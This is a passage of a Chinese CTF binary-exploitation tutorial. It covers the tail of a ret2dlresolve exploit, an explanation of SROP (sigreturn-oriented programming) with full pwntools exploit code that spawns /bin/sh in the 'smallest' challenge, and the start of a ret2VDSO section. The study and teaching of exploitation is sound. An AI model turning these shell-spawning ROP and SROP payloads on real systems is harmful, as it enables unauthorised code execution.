<span class="n">buf</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>

<span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s1">&#39;read&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">bss_base</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
<span class="c1">## used to call dl_Resolve()</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">dl_resolve_call</span><span class="p">(</span><span class="n">bss_base</span> <span class="o">+</span> <span class="mi">20</span><span class="p">,</span> <span class="n">bss_base</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>

<span class="n">buf</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">string</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>
<span class="c1">## used to make faking data, such relocation, Symbol, Str</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">dl_resolve_data</span><span class="p">(</span><span class="n">bss_base</span> <span class="o">+</span> <span class="mi">20</span><span class="p">,</span> <span class="s1">&#39;system&#39;</span><span class="p">)</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
</div>
<p>关于dl_resolve_call与dl_resolve_data的具体细节请参考roputils.py的源码，比较容易理解，需要注意的是，dl_resolve执行完之后也是需要有对应的返回地址的。</p>
<p>效果如下</p>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  ret2dlresolve git:(master) ✗ python roptool.py
[+] Starting local process &#39;./main&#39;: pid 6114
[DEBUG] Received 0x17 bytes:
    &#39;Welcome to XDCTF2015~!\n&#39;
[DEBUG] Sent 0x94 bytes:
    00000000  46 4c 68 78  52 36 67 6e  65 47 53 58  71 77 51 49  │FLhx│R6gn│eGSX│qwQI│
    00000010  32 43 6c 49  77 76 51 33  47 49 4a 59  50 74 6c 38  │2ClI│wvQ3│GIJY│Ptl8│
    00000020  57 54 68 4a  63 48 39 62  46 55 52 58  50 73 38 64  │WThJ│cH9b│FURX│Ps8d│
    00000030  72 4c 38 63  50 79 37 73  55 45 7a 32  6f 59 5a 42  │rL8c│Py7s│UEz2│oYZB│
    00000040  76 59 32 43  74 75 77 6f  70 56 61 44  6a 73 35 6b  │vY2C│tuwo│pVaD│js5k│
    00000050  41 77 78 77  49 72 7a 49  70 4d 31 67  52 6f 44 6f  │Awxw│IrzI│pM1g│RoDo│
    00000060  43 44 43 6e  45 31 50 48  53 73 64 30  6d 54 7a 5a  │CDCn│E1PH│Ssd0│mTzZ│
    00000070  a0 83 04 08  19 86 04 08  00 00 00 00  40 a0 04 08  │····│····│····│@···│
    00000080  64 00 00 00  80 83 04 08  28 1d 00 00  79 83 04 08  │d···│····│(···│y···│
    00000090  40 a0 04 08                                         │@···││
    00000094
[DEBUG] Sent 0x64 bytes:
    00000000  2f 62 69 6e  2f 73 68 00  73 52 46 66  57 43 59 52  │/bin│/sh·│sRFf│WCYR│
    00000010  66 4c 35 52  78 49 4c 53  54 a0 04 08  07 e9 01 00  │fL5R│xILS│T···│····│
    00000020  6e 6b 45 32  52 76 73 6c  00 1e 00 00  00 00 00 00  │nkE2│Rvsl│····│····│
    00000030  00 00 00 00  12 00 00 00  73 79 73 74  65 6d 00 74  │····│····│syst│em·t│
    00000040  5a 4f 4e 6c  6c 73 4b 5a  76 53 48 6e  38 37 49 47  │ZONl│lsKZ│vSHn│87IG│
    00000050  69 49 52 6c  50 44 38 67  45 77 75 6c  72 47 6f 67  │iIRl│PD8g│Ewul│rGog│
    00000060  55 41 52 4f                                         │UARO││
    00000064
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    &#39;ls\n&#39;
[DEBUG] Received 0x8d bytes:
    &#39;core\t     main    roptool.py   roputils.pyc\tstage2.py  stage4.py  stage6.py\n&#39;
    &#39;__init__.py  main.c  roputils.py  stage1.py\tstage3.py  stage5.py\n&#39;
core         main    roptool.py   roputils.pyc    stage2.py  stage4.py  stage6.py
__init__.py  main.c  roputils.py  stage1.py    stage3.py  stage5.py
</pre></div>
</div>
</div>
</div>
<div class="section" id="id6">
<h3>题目<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h3>
</div>
</div>
<div class="section" id="srop">
<h2>SROP<a class="headerlink" href="#srop" title="永久链接至标题">¶</a></h2>
<div class="section" id="id7">
<h3>基本介绍<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h3>
<p>SROP(Sigreturn Oriented Programming)于2014年被Vrije Universiteit Amsterdam的Erik Bosman提出，其相关研究<strong>``Framing Signals — A Return to Portable Shellcode``</strong>发表在安全顶级会议<a class="reference external" href="http://www.ieee-security.org/TC/SP2014">Oakland
2014</a>上，被评选为当年的<a class="reference external" href="http://www.ieee-security.org/TC/SP2014/awards.html">Best Student Papers</a>。其中相关的paper以及slides的链接如下：</p>
<p><a class="reference external" href="http://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf">paper</a></p>
<p><a class="reference external" href="https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf">slides</a></p>
<p>其中，<code class="docutils literal"><span class="pre">sigreturn</span></code>是一个系统调用，在类unix系统发生signal的时候会被间接地调用。</p>
</div>
<div class="section" id="signal">
<h3>signal机制<a class="headerlink" href="#signal" title="永久链接至标题">¶</a></h3>
<p>signal机制是类unix系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用kill来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p>
<div class="figure">
<img alt="Process of Signal Handlering" src="../../_images/ProcessOfSignalHandlering.png" />
</div>
<ol class="arabic simple">
<li>内核向某个进程发送signal机制，该进程会被暂时挂起，进入内核态。</li>
<li>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入signal信息，以及指向sigreturn的系统调用地址</strong>。此时栈的结构如下图所示，我们称ucontext以及siginfo这一段为Signal
Frame。<strong>需要注意的是，这一部分是在用户进程的地址空间的。</strong>之后会跳转到注册过的signal handler中处理相应的signal。因此，当signal handler执行完之后，就会执行sigreturn代码。</li>
</ol>
<div class="figure" id="id15">
<img alt="signal2-stack" src="../../_images/signal2-stack.png" />
<p class="caption"><span class="caption-text">signal2-stack</span></p>
</div>
<p>对于signal Frame来说，不同会因为架构的不同而因此有所区别，这里给出分别给出x86以及x64的sigcontext</p>
<p>x86</p>
<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="n">struct</span> <span class="n">sigcontext</span>
<span class="p">{</span>
  <span class="n">unsigned</span> <span class="n">short</span> <span class="n">gs</span><span class="p">,</span> <span class="n">__gsh</span><span class="p">;</span>
  <span class="n">unsigned</span> <span class="n">short</span> <span class="n">fs</span><span class="p">,</span> <span class="n">__fsh</span><span class="p">;</span>
  <span class="n">unsigned</span> <span class="n">short</span> <span class="n">es</span><span class="p">,</span> <span class="n">__esh</span><span class="p">;</span>
  <span class="n">unsigned</span> <span class="n">short</span> <span class="n">ds</span><span class="p">,</span> <span class="n">__dsh</span><span class="p">;</span>
  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">edi</span><span class="p">;</span>
  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">esi</span><span class="p">;</span>
  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">ebp</span><span class="p">;</span>
  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">esp</span><span class="p">;</span>
  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">ebx</span><span class="p">;</span>
  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">edx</span><span class="p">;</span>
  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">ecx</span><span class="p">;</span>
  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">eax</span><span class="p">;</span>
  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">trapno</span><span class="p">;</span>
  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">err</span><span class="p">;</span>
  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">eip</span><span class="p">;</span>
  <span class="n">unsigned</span> <span class="n">short</span> <span class="n">cs</span><span class="p">,</span> <span class="n">__csh</span><span class="p">;</span>
  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">eflags</span><span class="p">;</span>
  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">esp_at_signal</span><span class="p">;</span>
  <span class="n">unsigned</span> <span class="n">short</span> <span class="n">ss</span><span class="p">,</span> <span class="n">__ssh</span><span class="p">;</span>
  <span class="n">struct</span> <span class="n">_fpstate</span> <span class="o">*</span> <span class="n">fpstate</span><span class="p">;</span>
  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">oldmask</span><span class="p">;</span>
  <span class="n">unsigned</span> <span class="n">long</span> <span class="n">cr2</span><span class="p">;</span>
<span class="p">};</span>
</pre></div>
</div>
<p>x64</p>
<div class="code c++ highlight-default"><div class="highlight"><pre><span></span><span class="n">struct</span> <span class="n">_fpstate</span>
<span class="p">{</span>
  <span class="o">/*</span> <span class="n">FPU</span> <span class="n">environment</span> <span class="n">matching</span> <span class="n">the</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="n">FXSAVE</span> <span class="n">layout</span><span class="o">.</span>  <span class="o">*/</span>
  <span class="n">__uint16_t</span>                <span class="n">cwd</span><span class="p">;</span>
  <span class="n">__uint16_t</span>                <span class="n">swd</span><span class="p">;</span>
  <span class="n">__uint16_t</span>                <span class="n">ftw</span><span class="p">;</span>
  <span class="n">__uint16_t</span>                <span class="n">fop</span><span class="p">;</span>
  <span class="n">__uint64_t</span>                <span class="n">rip</span><span class="p">;</span>
  <span class="n">__uint64_t</span>                <span class="n">rdp</span><span class="p">;</span>
  <span class="n">__uint32_t</span>                <span class="n">mxcsr</span><span class="p">;</span>
  <span class="n">__uint32_t</span>                <span class="n">mxcr_mask</span><span class="p">;</span>
  <span class="n">struct</span> <span class="n">_fpxreg</span>    <span class="n">_st</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
  <span class="n">struct</span> <span class="n">_xmmreg</span>    <span class="n">_xmm</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
  <span class="n">__uint32_t</span>                <span class="n">padding</span><span class="p">[</span><span class="mi">24</span><span class="p">];</span>
<span class="p">};</span>
<span class="n">struct</span> <span class="n">sigcontext</span>
<span class="p">{</span>
  <span class="n">__uint64_t</span> <span class="n">r8</span><span class="p">;</span>
  <span class="n">__uint64_t</span> <span class="n">r9</span><span class="p">;</span>
  <span class="n">__uint64_t</span> <span class="n">r10</span><span class="p">;</span>
  <span class="n">__uint64_t</span> <span class="n">r11</span><span class="p">;</span>
  <span class="n">__uint64_t</span> <span class="n">r12</span><span class="p">;</span>
  <span class="n">__uint64_t</span> <span class="n">r13</span><span class="p">;</span>
  <span class="n">__uint64_t</span> <span class="n">r14</span><span class="p">;</span>
  <span class="n">__uint64_t</span> <span class="n">r15</span><span class="p">;</span>
  <span class="n">__uint64_t</span> <span class="n">rdi</span><span class="p">;</span>
  <span class="n">__uint64_t</span> <span class="n">rsi</span><span class="p">;</span>
  <span class="n">__uint64_t</span> <span class="n">rbp</span><span class="p">;</span>
  <span class="n">__uint64_t</span> <span class="n">rbx</span><span class="p">;</span>
  <span class="n">__uint64_t</span> <span class="n">rdx</span><span class="p">;</span>
  <span class="n">__uint64_t</span> <span class="n">rax</span><span class="p">;</span>
  <span class="n">__uint64_t</span> <span class="n">rcx</span><span class="p">;</span>
  <span class="n">__uint64_t</span> <span class="n">rsp</span><span class="p">;</span>
  <span class="n">__uint64_t</span> <span class="n">rip</span><span class="p">;</span>
  <span class="n">__uint64_t</span> <span class="n">eflags</span><span class="p">;</span>
  <span class="n">unsigned</span> <span class="n">short</span> <span class="n">cs</span><span class="p">;</span>
  <span class="n">unsigned</span> <span class="n">short</span> <span class="n">gs</span><span class="p">;</span>
  <span class="n">unsigned</span> <span class="n">short</span> <span class="n">fs</span><span class="p">;</span>
  <span class="n">unsigned</span> <span class="n">short</span> <span class="n">__pad0</span><span class="p">;</span>
  <span class="n">__uint64_t</span> <span class="n">err</span><span class="p">;</span>
  <span class="n">__uint64_t</span> <span class="n">trapno</span><span class="p">;</span>
  <span class="n">__uint64_t</span> <span class="n">oldmask</span><span class="p">;</span>
  <span class="n">__uint64_t</span> <span class="n">cr2</span><span class="p">;</span>
  <span class="n">__extension__</span> <span class="n">union</span>
    <span class="p">{</span>
      <span class="n">struct</span> <span class="n">_fpstate</span> <span class="o">*</span> <span class="n">fpstate</span><span class="p">;</span>
      <span class="n">__uint64_t</span> <span class="n">__fpstate_word</span><span class="p">;</span>
    <span class="p">};</span>
  <span class="n">__uint64_t</span> <span class="n">__reserved1</span> <span class="p">[</span><span class="mi">8</span><span class="p">];</span>
<span class="p">};</span>
</pre></div>
</div>
<p>​</p>
<ol class="arabic simple">
<li>signal handler返回后，内核为执行sigreturn系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新pop回对应的寄存器，最后恢复进程的执行。其中，32位的sigreturn的调用号为77，64位的系统调用号为15。</li>
</ol>
</div>
<div class="section" id="id8">
<h3>攻击原理<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h3>
<p>仔细回顾一下内核在signal信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在Signal Frame中。但是需要注意的是：</p>
<ul class="simple">
<li>Signal Frame被保存在用户的地址空间中，所以用户是可以读写的。</li>
<li>由于内核与信号处理程序无关(kernel agnostic about signal handlers)，它并不会去记录这个signal对应的Signal Frame，所以当执行sigreturn系统调用时，此时的Signal
Frame并不一定是之前内核为用户进程保存的Signal Frame。</li>
</ul>
<p>说到这里，其实，SROP的基本利用原理也就出现了。下面举两个简单的例子。</p>
<div class="section" id="shell">
<h4>获取shell<a class="headerlink" href="#shell" title="永久链接至标题">¶</a></h4>
<p>首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个Signal Frame，如下图所示，这里以64位为例子，给出Signal Frame更加详细的信息</p>
<div class="figure" id="id16">
<img alt="signal2-stack" src="../../_images/srop-example-1.png" />
<p class="caption"><span class="caption-text">signal2-stack</span></p>
</div>
<p>当系统执行完sigreturn系统调用之后，会执行一系列的pop指令以便于恢复相应寄存器的值，当执行到rip时，就会将程序执行流指向syscall地址，根据相应寄存器的值，此时，便会得到一个shell。</p>
</div>
<div class="section" id="system-call-chains">
<h4>system call chains<a class="headerlink" href="#system-call-chains" title="永久链接至标题">¶</a></h4>
<p>需要指出的是，上面的例子中，我们只是单独的获得一个shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可</p>
<ul class="simple">
<li><strong>控制栈指针。</strong></li>
<li><strong>把原来rip指向的``syscall`` gadget换成``syscall; ret`` gadget。</strong></li>
</ul>
<p>如下图所示 ，这样当每次syscall返回的时候，栈指针都会指向下一个Signal Frame。因此就可以执行一系列的sigreturn函数调用。</p>
<div class="figure" id="id17">
<img alt="signal2-stack" src="../../_images/srop-example-2.png" />
<p class="caption"><span class="caption-text">signal2-stack</span></p>
</div>
</div>
<div class="section" id="id9">
<h4>后续<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h4>
<p>需要注意的是，我们在构造ROP攻击的时候，需要满足下面的条件</p>
<ul class="simple">
<li><strong>可以通过栈溢出来控制栈的内容</strong></li>
<li><dl class="first docutils">
<dt><strong>需要知道相应的地址</strong></dt>
<dd><ul class="first last">
<li><strong>“/bin/sh”</strong></li>
<li><strong>Signal Frame</strong></li>
<li><strong>syscal</strong></li>
<li><strong>sigreturn</strong></li>
<li>需要有够大的空间来塞下整个sigal frame</li>
</ul>
</dd>
</dl>
</li>
</ul>
<p>此外，关于sigreturn以及syscall;ret这两个gadget在上面并没有提及。提出该攻击的论文作者发现了这些gadgets出现的某些地址：</p>
<div class="figure">
<img alt="gadget1" src="../../_images/srop-gadget-1.png" />
</div>
<p>并且，作者发现，有些系统上SROP的地址被随机化了，而有些则没有。比如说<code class="docutils literal"><span class="pre">Linux</span> <span class="pre">&lt;</span> <span class="pre">3.3</span> <span class="pre">x86_64</span></code>（在Debian 7.0， Ubuntu Long Term Support， CentOS
6系统中默认内核），可以直接在vsyscall中的固定地址处找到syscall&amp;return代码片段。如下</p>
<div class="figure">
<img alt="gadget1" src="../../_images/srop-gadget-2.png" />
</div>
<p>但是目前它已经被<code class="docutils literal"><span class="pre">vsyscall-emulate</span></code>和<code class="docutils literal"><span class="pre">vdso</span></code>机制代替了。此外，目前大多数系统都会开启ASLR保护，所以相对来说这些gadgets都并不容易找到。</p>
<p>值得一说的是，对于sigreturn系统调用来说，在64位系统中，sigreturn系统调用对应的系统调用号为15，只需要RAX=15，并且执行syscall即可实现调用syscall调用。而RAX寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说read函数的返回值为读取的字节数。</p>
</div>
</div>
<div class="section" id="id10">
<h3>利用工具<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h3>
<p><strong>值得一提的是，在目前的pwntools中已经集成了对于srop的攻击。</strong></p>
</div>
<div class="section" id="id11">
<h3>示例<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h3>
<p>这里以360春秋杯中的smallest-pwn为例进行简单介绍。基本步骤如下</p>
<p><strong>确定文件基本信息</strong></p>
<div class="code text highlight-default"><div class="highlight"><pre><span></span>➜  smallest file smallest
smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
</pre></div>
</div>
<p>可以看到该程序为64位静态链接版本。</p>
<p><strong>检查保护</strong></p>
<div class="code text highlight-default"><div class="highlight"><pre><span></span>➜  smallest checksec smallest
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</pre></div>
</div>
<p>程序主要开启了NX保护。</p>
<p><strong>漏洞发现</strong></p>
<p>实用IDA直接反编译看了一下，发现程序就几行汇编代码，如下</p>
<div class="code asm highlight-default"><div class="highlight"><pre><span></span><span class="n">public</span> <span class="n">start</span>
<span class="n">start</span> <span class="n">proc</span> <span class="n">near</span>
<span class="n">xor</span>     <span class="n">rax</span><span class="p">,</span> <span class="n">rax</span>
<span class="n">mov</span>     <span class="n">edx</span><span class="p">,</span> <span class="mi">400</span><span class="n">h</span>
<span class="n">mov</span>     <span class="n">rsi</span><span class="p">,</span> <span class="n">rsp</span>
<span class="n">mov</span>     <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span>
<span class="n">syscall</span>
<span class="n">retn</span>
<span class="n">start</span> <span class="n">endp</span>
</pre></div>
</div>
<p>根据syscall的编号为0，可以知道改程序执行的指令为read(0,$rsp,400)，即向栈顶读入400个字符。毫无疑问，这个是有栈溢出的。</p>
<p><strong>利用思路</strong></p>
<p>由于程序中并没有sigreturn调用，所以我们得自己构造，正好这里有read函数调用，所以我们可以通过read函数读取的字节数来设置rax的值。重要思路如下</p>
<ul class="simple">
<li>通过控制read读取的字符数来设置RAX寄存器的值，从而执行sigreturn</li>
<li>通过syscall执行execve(“/bin/sh”,0,0)来获取shell。</li>
</ul>
<p><strong>漏洞利用程序</strong></p>
<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="k">import</span> <span class="o">*</span>
<span class="n">small</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./smallest&#39;</span><span class="p">)</span>
<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">7777</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./smallest&#39;</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
<span class="n">syscall_ret</span> <span class="o">=</span> <span class="mh">0x00000000004000BE</span>
<span class="n">start_addr</span> <span class="o">=</span> <span class="mh">0x00000000004000B0</span>
<span class="c1">## set start addr three times</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">start_addr</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="c1">## modify the return addr to start_addr+3</span>
<span class="c1">## so that skip the xor rax,rax; then the rax=1</span>
<span class="c1">## get stack addr</span>
<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xb3</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">stack_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()[</span><span class="mi">8</span><span class="p">:</span><span class="mi">16</span><span class="p">])</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;leak stack addr :&#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">))</span>

<span class="c1">## make the rsp point to stack_addr</span>
<span class="c1">## the frame is read(0,stack_addr,0x400)</span>
<span class="n">sigframe</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
<span class="n">sigframe</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_read</span>
<span class="n">sigframe</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">sigframe</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="n">stack_addr</span>
<span class="n">sigframe</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x400</span>
<span class="n">sigframe</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">stack_addr</span>
<span class="n">sigframe</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall_ret</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">start_addr</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">sigframe</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="c1">## set rax=15 and call sigreturn</span>
<span class="n">sigreturn</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="mi">7</span>
<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">sigreturn</span><span class="p">)</span>

<span class="c1">## call execv(&quot;/bin/sh&quot;,0,0)</span>
<span class="n">sigframe</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
<span class="n">sigframe</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_execve</span>
<span class="n">sigframe</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">+</span> <span class="mh">0x120</span>  <span class="c1"># &quot;/bin/sh&quot; &#39;s addr</span>
<span class="n">sigframe</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mh">0x0</span>
<span class="n">sigframe</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x0</span>
<span class="n">sigframe</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">stack_addr</span>
<span class="n">sigframe</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall_ret</span>

<span class="n">frame_payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">start_addr</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">sigframe</span><span class="p">)</span>
<span class="nb">print</span> <span class="nb">len</span><span class="p">(</span><span class="n">frame_payload</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">frame_payload</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0x120</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">frame_payload</span><span class="p">))</span> <span class="o">*</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>
<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">sigreturn</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
</div>
<p>其基本流程为</p>
<ul class="simple">
<li>读取三个程序起始地址</li>
<li>程序返回时，利用第一个程序起始地址读取地址，修改返回地址(即第二个程序起始地址)为源程序的第二条指令，并且会设置rax=1</li>
<li>那么此时将会执行write(1,$esp,0x400)，泄露栈地址。</li>
<li>利用第三个程序起始地址进而读入payload</li>
<li>再次读取构造sigreturn调用，进而将向栈地址所在位置读入数据，构造execve(‘/bin/sh’,0,0)</li>
<li>再次读取构造sigreturn调用，从而获取shell。</li>
</ul>
</div>
<div class="section" id="id12">
<h3>题目<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h3>
<ul class="simple">
<li><a class="reference external" href="https://brant-ruan.github.io/resources/Binary/learnPwn/fuckup_56f604b0ea918206dcb332339a819344">Defcon 2015 Qualifier: fuckup</a></li>
</ul>
<p>参考阅读</p>
<ul class="simple">
<li><a class="reference external" href="http://www.freebuf.com/articles/network/87447.html">Sigreturn Oriented Programming (SROP) Attack攻击原理</a></li>
<li><a class="reference external" href="https://www.slideshare.net/AngelBoy1/sigreturn-ori">SROP by Angle Baby</a></li>
<li><a class="reference external" href="http://www.cs.utexas.edu/~bismith/test/syscalls/syscalls64_orig.html">系统调用</a></li>
</ul>
</div>
</div>
<div class="section" id="ret2vdso">
<h2>ret2VDSO<a class="headerlink" href="#ret2vdso" title="永久链接至标题">¶</a></h2>
<div class="section" id="vdso">
<h3>VDSO介绍<a class="headerlink" href="#vdso" title="永久链接至标题">¶</a></h3>
<p>什么是VDSO(Virtual Dynamically-linked Shared
Object)呢？听其名字，大概是虚拟动态链接共享对象，所以说它应该是虚拟的，与虚拟内存一直，在计算机中本身并不存在。具体来说，它是将内核态的调用映射到用户地址空间的库。那么它为什么会存在呢？这是因为有些系统调用经常被用户使用，这就会出现大量的用户态与内核态切换的开销。通过vdso，我们可以大量减少这样的开销，同时也可以使得我们的路径更好。这里路径更好指的是，我们不需要使用传统的int
0x80来进行系统调用，不同的处理器实现了不同的快速系统调用指令</p>
<ul class="simple">
<li>intel实现了sysenter，sysexit</li>
<li>amd实现了syscall，sysret</li>
</ul>
<p>当不同的处理器架构实现了不同的指令时，自然就会出现兼容性问题，所以linux实现了vsyscall接口，在底层会根据具体的结构来进行具体操作。而vsyscall就实现在vdso中。</p>
<p>这里，我们顺便来看一下vdso，在Linux(kernel 2.6 or upper)中执行ldd /bin/sh, 会发现有个名字叫linux-vdso.so.1(老点的版本是linux-gate.so.1)的动态文件, 而系统中却找不到它, 它就是VDSO。 例如:</p>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  ~ ldd /bin/sh
    linux-vdso.so.1 =&gt;  (0x00007ffd8ebf2000)
    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f84ff2f9000)
    /lib64/ld-linux-x86-64.so.2 (0x0000560cae6eb000)
</pre></div>
</div>
<p>除了快速系统调用，glibc也提供了VDSO的支持, open(), read(), write(), gettimeofday()都可以直接使用VDSO中的实现。使得这些调用速度更快。 内核新特性在不影响glibc的情况下也可以更快的部署。</p>
<p>这里我们以intel的处理器为例，进行简单说明。</p>
<p>其中sysenter的参数传递方式与int 0x80一致，但是我们可能需要自己布置好 function prolog（32位为例）</p>
<div class="code asm highlight-default"><div class="highlight"><pre><span></span><span class="n">push</span> <span class="n">ebp</span>
